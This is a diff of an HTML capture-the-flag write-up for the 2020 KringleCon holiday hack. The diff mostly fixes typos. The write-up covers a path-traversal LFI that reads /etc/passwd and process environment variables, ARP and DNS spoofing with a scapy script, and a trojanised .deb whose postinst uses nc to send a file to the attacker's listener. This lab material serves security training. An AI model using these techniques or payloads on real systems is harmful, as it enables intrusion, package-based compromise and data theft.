@@ -105,6 +105,10 @@
                     </li>
                 </ul>
                 <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">Achivement Kiosk</a>
+                    </li>
+                </ul>
+                <ul>
                     <li class="toctree-l1"><a class="reference internal" href="../achivements/A-Elf-Code/A-Elf-Code/">Achivement ElfCode</a>
                     </li>
                 </ul>
@@ -114,10 +118,6 @@
                 </ul>
                 <ul>
                     <li class="toctree-l1"><a class="reference internal" href="../achivements/A-Redis/A-Redis/">Achivement Redis</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">Achivement Kiosk</a>
                     </li>
                 </ul>
                 <ul>
@@ -253,7 +253,7 @@ docs/                   # Source Markup documents
 <p>ANSWER: North Pole: The Frostiest Place on Earth</p>
 <p><img alt="Access" src="../objectives/2-Investigate-S3-Bucket/2-access.png" /></p>
 <h2 id="objectives-2-investigate-s3-bucket-2-investigate-s3-bucket-starting-the-challenge">Starting the challenge</h2>
-<p>Click on the challenge terminal and it will pop-up on the scree and will show the following banner:</p>
+<p>Click on the challenge terminal and it will pop-up on the screen and will show the following banner:</p>
 <pre><code>Can you help me? Santa has been experimenting with new wrapping technology, and
 we've run into a ribbon-curling nightmare!
 We store our essential data assets in the cloud, and what a joy it's been!
@@ -265,7 +265,7 @@ a file extension using the apropos command.
 To see this help again, run cat /etc/motd.
 elf@098428dd9488:~$
 </code></pre>
-<h2 id="objectives-2-investigate-s3-bucket-2-investigate-s3-bucket-get-the-pakcage">Get the pakcage</h2>
+<h2 id="objectives-2-investigate-s3-bucket-2-investigate-s3-bucket-get-the-package">Get the package</h2>
 <p>The bucket finder script needs a word list so we add wraper3000 as per the description on the banner and we execute the script</p>
 <pre><code>elf@098428dd9488:~$ echo &quot;wrapper3000&quot; &gt;&gt;bucket_finder/wordlist 
 elf@098428dd9488:~$ bucket_finder.rb -r us -d bucket_finder/wordlist -l log.txt
@@ -308,7 +308,7 @@ There is a single file in the directory and contains a base64 encoded payload.
 <pre><code>app-64.7z   nsExec.dll   nsis7z.dll   nsProcess.dll   SpiderBanner.dll   StdUtils.dll   System.dll  'Uninstall santa-shop.exe'   WinShell.dll
 </code></pre>
 <p>We extract the <code>app-64.7z</code> file with <code>7z e app-64.7z</code> which will extract 74 files and 3 folders.</p>
-<p>As many of the files are binary a simple grep don't get much useful but we can see that the <code>Chormium LICENSES</code> make cause a lof of false positives, so we make a search for strings on every file except the that searching for a password assignment in the code.</p>
+<p>As many of the files are binary a simple grep doesn't get much useful but we can see that the <code>Chormium LICENSES</code> make cause a lot of false positives, so we make a search for strings on every file except the that searching for a password assignment in the code.</p>
 <pre><code>for f in $(find . -type f |grep -v LICEN); do cat $f |strings -n 20 |egrep -i &quot;password ?= ?'&quot; ;done
 const SANTA_PASSWORD = 'santapass';
     this.password = '';
@@ -321,20 +321,20 @@ cat: ./Uninstall: No such file or directory
 <p>Difficulty: 2/5</p>
 <p><img alt="Difficulty" src="../img/Dificulty2.png" /></p>
 <p>Talk to Pepper Minstix in the entryway to get some hints about the Santavator.</p>
-<h2 id="objectives-4-operate-the-santavator-4-operate-the-santavator-minumum-items">Minumum items</h2>
-<p>Find green bulb in courtyard.
-Find boltnut in front of elevator.</p>
+<h2 id="objectives-4-operate-the-santavator-4-operate-the-santavator-minimum-items">Minimum items</h2>
+<p>Find the green bulb in courtyard.
+Find the boltnut in front of elevator.</p>
 <h2 id="objectives-4-operate-the-santavator-4-operate-the-santavator-operating-the-santavator">Operating the santavator</h2>
-<p>To use the santavator you need to open the panel and make the stream of partivles to fork into the right colors to activate teh respective floors.</p>
-<p>Wondering around the castle we will be able to find the different items, the first items found are one of the nuts and the green bulb and as we continue navigating the castle we find the red and yellow bulb, a candy cane, a blue ball, a magnetic bulb that we can arrange as shown on the image to enable the different elavator buttons.</p>
-<p>Later in the game after solbing the lights and vending machine challenges is possible to get from the vending machine a couple of extra items, the red and blue portals.</p>
+<p>To use the santavator you need to open the panel and make the stream of particles to fork into the right colors to activate the respective floors.</p>
+<p>Wondering around the castle we will be able to find the different items, the first items found are one of the nuts and the green bulb and as we continue navigating the castle we find the red and yellow bulb, a candy cane, a blue ball, a magnetic bulb that we can arrange as shown on the image to enable the different elevator buttons.</p>
+<p>Later in the game after solving the lights and vending machine challenges is possible to get from the vending machine a couple of extra items, the red and blue portals.</p>
 <p><img alt="Solution with all items" src="../objectives/4-Operate-the-Santavator/4-SolutionPortals.png" /></p></section><section class="print-page" id="objectives-5-open-hid-lock-5-open-hid-lock"><h1 id="objectives-5-open-hid-lock-5-open-hid-lock-5-open-hid-lock">5) Open HID Lock</h1>
 <p>Difficulty: 2/5</p>
 <p><img alt="Difficulty" src="../img/Dificulty2.png" /></p>
 <p>Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.</p>
 <p><img alt="Access" src="../objectives/5-Open-HID-Lock/5-Open-HID-Lock-access.png" /></p>
 <h2 id="objectives-5-open-hid-lock-5-open-hid-lock-get-the-proxmark3">Get the Proxmark3</h2>
-<p>Once we have the different light bulbds to enable the elavator workshop button, we can go there and use the Proxmark3 item we found.</p>
+<p>Once we have the different light bulbs to enable the elevator workshop button, we can go there and use the Proxmark3 item we found.</p>
 <h2 id="objectives-5-open-hid-lock-5-open-hid-lock-use-the-proxmark3-to-acquire-access-card-code">Use the Proxmark3 to acquire access card code</h2>
 <p>To use the proxmark item we need to be close to one of the items that restrict access or one of the avatars that has access cards to clone them with.</p>
 <p><img alt="Proxmark3" src="../objectives/5-Open-HID-Lock/5-Open-HID-Lock-Proxmark3.png" /></p>
@@ -352,7 +352,7 @@ lf hid sim -r 2006e22f0e
 </code></pre>
 <p><img alt="Unlock HID door" src="../objectives/5-Open-HID-Lock/5-Open-HID-Lock-solution.png" /></p>
 <h1 id="objectives-5-open-hid-lock-5-open-hid-lock-transform-into-santa">Transform into Santa</h1>
-<p>Open the HID door and go all the way to the left then all the way down and click on the two lightihng dots.</p>
+<p>Open the HID door and go all the way to the left then all the way down and click on the two lighting dots.</p>
 <p><img alt="Become Santa" src="../objectives/5-Open-HID-Lock/5-Open-HID-Lock-BecomingSanta.png" /></p></section><section class="print-page" id="objectives-6-splunk-challenge-6-splunk-challenge"><h1 id="objectives-6-splunk-challenge-6-splunk-challenge-6-splunk-challenge">6) Splunk Challenge</h1>
 <p>Difficulty: 3/5</p>
 <p><img alt="Difficulty" src="../img/Dificulty3.png" /></p>
@@ -361,34 +361,34 @@ lf hid sim -r 2006e22f0e
 <p><img alt="Access" src="../objectives/6-Splunk-Challenge/6-Splunk-Challenge-access.png" /></p>
 <h1 id="objectives-6-splunk-challenge-6-splunk-challenge-navigating-splunk">Navigating Splunk</h1>
 <p>The <code>KringleCastle SOC</code> application contains several hitns to solve the challenges in the different chat conversations, after every solved question a new one will appear as well as new hints to solve the challenge.</p>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate">1.   How many distinct MITRE ATT&amp;CK techniques did Alice emulate?</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate">1.  How many distinct MITRE ATT&amp;CK techniques did Alice emulate?</h3>
 <p>Request to solve :
 | eventcount summarize=false index=<em> index=_</em> | dedup index | fields index
-There are 27 results, but there may be duplicates and there are subtechniques 
+There are 27 results, but there may be duplicates and there are sub-techniques 
 * 13</p>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space">2.   What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space">2.  What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</h3>
 <p>Request to solve :
 | eventcount summarize=false index=T1059.003*  | dedup index | fields index</p>
 <ul>
 <li>t1059.003-main t1059.003-win</li>
 </ul>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid">3.  One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid">3.  One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?</h3>
 <p>Request to solve :
 index=t1082<em> CommandLine="</em>" * we see that there are REG QUERIES 
 index=t1082<em> CommandLine="REG</em>"
 * HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</p>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp">4.   According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp">4.  According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)</h3>
 <p>Request to solve :
 index=attack
 index=attack "Test Name"="OSTAP*"
 * 2020-11-30T17:44:15Z</p>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component">5. One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component">5. One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?</h3>
 <p>Clone the RedCanary repository and find the script related to audio and use the cmdlet name to search
 Request to solve :
 index=* EventID=1 "WindowsAudioDevice-Powershell-Cmdlet"
 ProcessId 3648
 * 3648</p>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation">6. Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation">6. Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</h3>
 <p>Request to solve :
 index=<em> EventID=1 CommandLine="</em>.bat*"</p>
 <p>Clone the RedCanary repository and find the Discovery.bat
@@ -397,16 +397,16 @@ systeminfo
 qwinsta
 quser
 * quser</p>
-<h2 id="objectives-6-splunk-challenge-6-splunk-challenge-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range">7. According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range</h2>
+<h3 id="objectives-6-splunk-challenge-6-splunk-challenge-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range">7. According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range</h3>
 <p>Request to solve :
 index=<em> sourcetype=bro</em> 
 index=* host=zeek sourcetype="bro:x509:json" "DC" "certificate.subject"="CN=win-dc-748.attackrange.local"| top limit=20 "certificate.serial"
 * 55FCEEBB21270D9249E86F4B9DC7AA60</p>
 <p>Challenge Question
 What is the name of the adversary group that Santa feared would attack KringleCon?
-Challenge given in chat : 7FXjP1lyfKbyDK/MChyf36h7
-Key given in talk : Stay Frosty
-RC4 encryption
+Challenge given in chat: <code>7FXjP1lyfKbyDK/MChyf36h7</code>
+Key given in talk: <code>Stay Frosty</code></p>
+<p>RC4 encryption
 https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4(%7B'option':'UTF8','string':'Stay%20Frosty'%7D,'Latin1','Latin1')&amp;input=N0ZYalAxbHlmS2J5REsvTUNoeWYzNmg3</p>
 <p>ASWER : The Lollipop Guild</p>
 <p><img alt="Solution" src="../objectives/6-Splunk-Challenge/6-Splunk-Challenge-solution.png" /></p></section><section class="print-page" id="objectives-7-solve-the-sleighs-can-d-bus-7-solve-the-sleighs-can-d-bus"><h1 id="objectives-7-solve-the-sleighs-can-d-bus-7-solve-the-sleighs-can-d-bus-7-solve-the-sleighs-can-d-bus">7) Solve the sleighs CAN-D-BUS</h1>
@@ -415,7 +415,7 @@ https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4
 <p>Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.</p>
 <p><img alt="Access" src="../objectives/7-Solve-the-sleighs-CAN-D-BUS/7-Solve-the-sleighs-CAN-D-BUS-access.png" /></p>
 <h1 id="objectives-7-solve-the-sleighs-can-d-bus-7-solve-the-sleighs-can-d-bus-finding-the-needle-in-the-hey">Finding the needle in the hey</h1>
-<p>The Sledge console displays numbers that can be filtered by entering the respective filters containing the hex codes. The possible filter are <code>ALL</code>, <code>Equals</code>, <code>Not Equal</code>, <code>Contains</code>, <code>Greater</code>, and <code>Less</code>.</p>
+<p>The Sledge console displays numbers that can be filtered by entering the respective filters containing the hex codes. The possible filters are <code>ALL</code>, <code>Equals</code>, <code>Not Equal</code>, <code>Contains</code>, <code>Greater</code>, and <code>Less</code>.</p>
 <p>By process of elimination check the ranges of each control but to eliminate the noise we set the following filters:</p>
 <pre><code>188# equals 000000000000
 244# equals 000000000000
@@ -423,7 +423,7 @@ https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4
 080# equals 000000000000
 </code></pre>
 <p>The first code that stands out is <code>19B#0000000F2057</code>, it spells out FROST in leet so we filter it as well. After setting all these initial settings there are no more readings if the controls are all set to the default values (<code>0</code>).</p>
-<p>Now check the controls one by one, when testing the <code>Brake</code> control, it stands out that Break <code>080#</code> returns two different types of values <code>000001</code>-<code>000064</code> and another set of vlaues starts to appear when the break is higher than <code>3</code>, all of them starting with <code>FFFF</code> so we add another filter for all <code>080#</code> values containing <code>FFFF</code> in the first two positions, the testing with the started sleigh and acceleration seems fine so now we remove the initial filters and boom Sleigh deFrosted!</p>
+<p>Now check the controls one by one, when testing the <code>Brake</code> control, it stands out that Break <code>080#</code> returns two different types of values <code>000001</code>-<code>000064</code> and another set of values starts to appear when the break is higher than <code>3</code>, all of them starting with <code>FFFF</code> so we add another filter for all <code>080#</code> values containing <code>FFFF</code> in the first two positions, the testing with the started sleigh and acceleration seems fine so now we remove the initial filters and boom Sleigh deFrosted!</p>
 <p>Final Filters</p>
 <pre><code>19B# equals 0000000F2057
 080# contains FFFF
@@ -435,7 +435,7 @@ https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)RC4
 <p>ANSWER: JackFrostWasHere</p>
 <p><img alt="Access" src="../objectives/8-Broken-Tag-Generator/8-Broken-Tag-Generator-access.png" /></p>
 <h2 id="objectives-8-broken-tag-generator-8-broken-tag-generator-finding-the-vulnerability">Finding the vulnerability</h2>
-<p>After requesting the URL https://tag-generator.kringlecastle.com/image the server sends a hint of the possible vulenrability that is visible in the browser but curl or burp give more information, where we can see this response use <code>501</code> http status code.</p>
+<p>After requesting the URL https://tag-generator.kringlecastle.com/image the server sends a hint of the possible vulnerability that is visible in the browser but curl or burp give more information, where we can see this response use <code>501</code> http status code.</p>
 <pre><code>HTTP/1.1 501 Not Implemented
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:22:22 GMT
@@ -450,7 +450,7 @@ X-Frame-Options: SAMEORIGIN
 
 &lt;p&gt;Error in /app/lib/app.rb: ID is missing!&lt;/p&gt;
 </code></pre>
-<p>Next request, lets attempt a LFI on the <code>id</code> parameter using a well known file <code>/etc/passwd</code>, the request failed but the error message is different, this time the server sends a <code>404</code> not found with the message route not found in <code>/app/lib/app.rb</code>.</p>
+<p>Next request, lets attempt a LFI on the <code>id</code> parameter using a well-known file <code>/etc/passwd</code>, the request failed but the error message is different, this time the server sends a <code>404</code> not found with the message route not found in <code>/app/lib/app.rb</code>.</p>
 <pre><code>HTTP/1.1 404 Not Found
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:24:33 GMT
@@ -463,7 +463,7 @@ X-Content-Type-Options: nosniff
 
 &lt;p&gt;Error in /app/lib/app.rb: Route not found&lt;/p&gt;
 </code></pre>
-<p>This means that the application may prepend a fixed string to our request so lets improve our previous request with a path traversal.</p>
+<p>This means that the application may prepend a fixed string to our request so let's improve our previous request with a path traversal.</p>
 <pre><code>HTTP/1.1 200 OK
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:30:00 GMT
@@ -498,7 +498,7 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 app:x:1000:1000:,,,:/home/app:/bin/bash
 </code></pre>
-<p>Now we know that it sucessfully retrieves files from the file system, the target is to obtain the value of the <code>GREETZ</code> environmental variable. To get all environmental variables of the runnin process we can send the request to https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ</p>
+<p>Now we know that it sucessfully retrieves files from the file system, the target is to obtain the value of the <code>GREETZ</code> environmental variable. To get all environmental variables of the runnin process we can send the request to <code>https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ</code></p>
 <pre><code>HTTP/1.1 200 OK
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:33:44 GMT
@@ -530,7 +530,7 @@ sure to copy off any essential work you have done as you go.</p>
 <p>IP address: 10.6.0.2
 MAC address: 02:42:0a:06:00:02</p>
 <h2 id="objectives-9-arp-shenanigans-9-arp-shenanigans-arp-poisoning">ARP poisoning</h2>
-<p>To start we run tcpdump to check what ip is sedning the ARP requests.</p>
+<p>To start we run tcpdump to check what ip is sending the ARP requests.</p>
 <pre><code>guest@29847c69ad6a:~$ tcpdump -n 
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
@@ -570,10 +570,10 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:16:15.618236 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
 04:16:15.646731 IP 10.6.6.35.22953 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
 </code></pre>
-<p>Now we modify the DNS poisoning script with the information we already know so it respond to all DNS requests giving our own machin IP and MAC addresses as destination.</p>
+<p>Now we modify the DNS poisoning script with the information we already know so it responds to all DNS requests giving our own machine IP and MAC addresses as destination.</p>
 <p><a href="#objectives-9-arp-shenanigans-dns.py">DNS script</a></p>
 <h3 id="objectives-9-arp-shenanigans-9-arp-shenanigans-modified-values-for-dns-poisoning">Modified values for DNS poisoning</h3>
-<p>```ipaddr_we_arp_spoofed = "10.6.6.53"
+<pre><code>ipaddr_we_arp_spoofed = &quot;10.6.6.53&quot;
 def handle_dns_request(packet):
     # Need to change mac addresses, Ip Addresses, and ports below.
     # We also need
@@ -582,7 +582,7 @@ def handle_dns_request(packet):
     dstmac=packet[Ether].src
     srcmac=packet[Ether].dst
     eth = Ether(src=srcmac, dst=dstmac)   # need to replace mac addresses
-    ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed)             # need to replace IP addresses
+    ip  = IP(dst=&quot;10.6.6.35&quot;, src=ipaddr_we_arp_spoofed)             # need to replace IP addresses
     udp = UDP(dport=dstport, sport=srcport)                             # need to replace ports
     dns = DNS(
         # MISSING DNS RESPONSE LAYER VALUES
@@ -591,14 +591,14 @@ def handle_dns_request(packet):
         qdcount=1, ancount=1, nscount=0, arcount=0, 
         qd=DNSQR(qname=packet[DNS].qd.qname, qtype='A', qclass=1),
         an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass=1,
-        ttl=600, rdata="10.6.0.2")
+        ttl=600, rdata=&quot;10.6.0.2&quot;)
     )
     dns_response = eth / ip / udp / dns
-    sendp(dns_response, iface="eth0")</p>
-<pre><code>## Verify incoming traffic
-Now we run the DNS poisoning script in another pane and verify that both the ARP and the DNS poisoning attacks are working.
+    sendp(dns_response, iface=&quot;eth0&quot;)
 </code></pre>
-<p>guest@29847c69ad6a:~$ tcpdump -n src host 10.6.6.35
+<h2 id="objectives-9-arp-shenanigans-9-arp-shenanigans-verify-incoming-traffic">Verify incoming traffic</h2>
+<p>Now we run the DNS poisoning script in another pane and verify that both the ARP and the DNS poisoning attacks are working.</p>
+<pre><code>guest@29847c69ad6a:~$ tcpdump -n src host 10.6.6.35
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:32:19.882406 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
@@ -611,21 +611,18 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:32:20.489449 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [FP.], seq 2024:2244, ack 810, win 505, options [nop,nop,TS val 626668890 ecr 2887327831], length 220
 04:32:20.490952 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [.], ack 811, win 505, options [nop,nop,TS val 626668891 ecr 2887327836], length 0
 04:32:20.522762 IP 10.6.6.35.49790 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
-04:32:20.934339 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28</p>
-<pre><code>
-The machine is now receiving request from the poisoned machine on port 80, to verify the type of requests the machine receives we use `python3` `http.server` module.
+04:32:20.934339 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
 </code></pre>
-<p>uest@29847c69ad6a:~$ python3 -m http.server 80
+<p>The machine is now receiving request from the poisoned machine on port 80, to verify the type of requests the machine receives we use <code>python3</code> <code>http.server</code> module.</p>
+<pre><code>uest@29847c69ad6a:~$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.6.6.35 - - [21/Dec/2020 04:34:47] code 404, message File not found
-10.6.6.35 - - [21/Dec/2020 04:34:47] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -</p>
-<pre><code>
-The server receives requests for a debian package `/pub/jfrost/backdoor/suriv_amd64.deb`, so we can use that to deliver a malicious package and retrieve the flag.
-
-## Building malicious deb pakcage
-We reuse one fo teh packages already present on the machine to build our malicious payload.
+10.6.6.35 - - [21/Dec/2020 04:34:47] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
 </code></pre>
-<p>cd debs
+<p>The server receives requests for a debian package <code>/pub/jfrost/backdoor/suriv_amd64.deb</code>, so we can use that to deliver a malicious package and retrieve the flag.</p>
+<h2 id="objectives-9-arp-shenanigans-9-arp-shenanigans-building-malicious-deb-package">Building malicious deb package</h2>
+<p>We reuse one of the packages already present on the machine to build our malicious payload.</p>
+<pre><code>cd debs
 dpkg -x nano_4.8-1ubuntu1_amd64.deb work
 mkdir work/DEBIAN
 ar -x nano_4.8-1ubuntu1_amd64.deb
@@ -633,47 +630,51 @@ xz -d -v control.tar.xz
 tar -xvf control.tar ./control
 tar -xvf control.tar ./postinst
 mv control work/DEBIAN/
-mv postinst work/DEBIAN/</p>
-<pre><code>We modify the post installation script to exfiltrate the contents of the file we want and we set our machine to listen on the port we specify on the script.
+mv postinst work/DEBIAN/
 </code></pre>
-<p>work/DEBIAN/postinst  contents 
----START---</p>
-<h1 id="objectives-9-arp-shenanigans-9-arp-shenanigans-binsh">!/bin/sh</h1>
-<p>if [ "$1" = "configure" ] || [ "$1" = "abort-upgrade" ]; then
+<p>We modify the post installation script to exfiltrate the contents of the file we want and we set our machine to listen on the port we specify on the script.</p>
+<pre><code>work/DEBIAN/postinst  contents 
+---START---
+#!/bin/sh
+
+if [ &quot;$1&quot; = &quot;configure&quot; ] || [ &quot;$1&quot; = &quot;abort-upgrade&quot; ]; then
             update-alternatives --install /usr/bin/editor editor /bin/nano 40 \
                           --slave /usr/share/man/man1/editor.1.gz editor.1.gz \
                                 /usr/share/man/man1/nano.1.gz
                 update-alternatives --install /usr/bin/pico pico /bin/nano 10 \
                               --slave /usr/share/man/man1/pico.1.gz pico.1.gz \
                                     /usr/share/man/man1/nano.1.gz
-fi</p>
-<p>echo "<code>cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt |base64</code>" |nc 10.6.0.2 8000
----END---</p>
-<pre><code>We finish building the package and create the correct directory structure to match the incoming requests
+fi
+
+echo &quot;`cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt |base64`&quot; |nc 10.6.0.2 8000
+---END---
 </code></pre>
-<p>dpkg-deb --build work/
+<p>We finish building the package and create the correct directory structure to match the incoming requests</p>
+<pre><code>dpkg-deb --build work/
 mkdir -p pub/jfrost/backdoor
-mv work.deb pub/jfrost/backdoor/suriv_amd64.deb</p>
-<pre><code>
-## Setup the exfiltration listener
-We set `nc` to listen in port `8000` as we configured our payload and perform the decoding in another `tmux` pane.
+mv work.deb pub/jfrost/backdoor/suriv_amd64.deb
 </code></pre>
-<p>nc -lvp 8000 |base64 -d |tee -a NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</p>
-<pre><code>
-## Serving the malicious payload
-We set `python` `http.server` module to listen on port `80` and serve the file.
+<h2 id="objectives-9-arp-shenanigans-9-arp-shenanigans-setup-the-exfiltration-listener">Setup the exfiltration listener</h2>
+<p>We set <code>nc</code> to listen in port <code>8000</code> as we configured our payload and perform the decoding in another <code>tmux</code> pane.</p>
+<pre><code>nc -lvp 8000 |base64 -d |tee -a NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
 </code></pre>
-<p>python3 -m http.server 80</p>
-<pre><code>
-## Exfiltrated file
+<h2 id="objectives-9-arp-shenanigans-9-arp-shenanigans-serving-the-malicious-payload">Serving the malicious payload</h2>
+<p>We set <code>python</code> <code>http.server</code> module to listen on port <code>80</code> and serve the file.</p>
+<pre><code>python3 -m http.server 80
+
 </code></pre>
-<p>January 20, 2020</p>
-<p>Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole</p>
-<p>Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.</p>
-<p>Roll call of Board members please:
+<h2 id="objectives-9-arp-shenanigans-9-arp-shenanigans-exfiltrated-file">Exfiltrated file</h2>
+<pre><code>January 20, 2020
+
+Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole
+
+Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.
+
+Roll call of Board members please:
 Chairman Jack Frost - Present
-Vice Chairman Mother Nature - Present</p>
-<p>Superman - Present
+Vice Chairman Mother Nature - Present
+
+Superman - Present
 Clarice - Present
 Yukon Cornelius - HERE!
 Ginger Breaddie - Present
@@ -685,18 +686,24 @@ Krampus - Growl
 Dolly - Present
 Snow Miser - Heya!
 Alabaster Snowball - Hello
-Queen of the Winter Spirits - Present</p>
-<p>ALSO PRESENT:
+Queen of the Winter Spirits - Present
+
+ALSO PRESENT:
                 Kris Kringle
                 Pepper Minstix
                 Heat Miser
-                Father Time</p>
-<p>Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.</p>
-<p>Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.</p>
-<p>OLD BUSINESS: No Old Business.</p>
-<p>RESOLUTIONS:
